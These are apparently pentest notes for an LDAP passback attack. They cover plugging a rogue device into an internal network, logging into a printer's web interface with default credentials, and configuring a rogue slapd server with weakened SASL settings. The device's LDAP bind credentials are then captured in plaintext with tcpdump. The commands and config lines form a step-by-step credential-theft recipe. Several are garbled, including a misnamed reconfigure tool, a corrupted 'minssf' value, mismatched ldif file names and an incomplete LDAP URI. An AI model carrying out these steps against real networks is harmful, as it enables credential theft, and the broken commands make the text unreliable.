## Requirements: 

#### Initial access to the internal network (example: plugging in a rogue device in a boardroom)

#### Gain access to a device's configuration where the LDAP parameters are specified. (Example: the web interface of a network printer)

#### They have usually default credentials (admin:admin, admin:password, etc.)

#### Host a rogue LDAP server:

#### sudo systemctl enable slapd

#### sudo delay-reconfigure -p low slapd

#### 1: No

#### 2: Enter target domain

#### 3: Organization name

#### 4: Any admin password

#### 5: Set MDB as the LDAP database

#### 6: No 

#### 7: Yes

#### 8: Create new ldif file

### Example: 

##### #dcSaslSecProps.ldif

##### dn: cn=config

##### replace:olcSaslSecProps

##### olcSaslSecProps: noanonymous,minssf=Qpasscred

#### minssf = No protection

#### noanonymous = Disables anonymous login

#### olcSaslSecProps = Specifies the SASL security properties

#### 9: sudo ldapmodify -Y EXTERNAL -H ldap:// -f ./olcSaslSecProps.ldif && sudo service slapd restart

#### 10: Verify with: ldapsearch -H ldap:// -x -LLL -s base -b " " supportedSASLmechanisms)

#### 11: Capture LDAP credentials

#### sudo tcpdump -SX -i TARGET_INTERFACE tcp port 389

### We should get credentials in plain text.
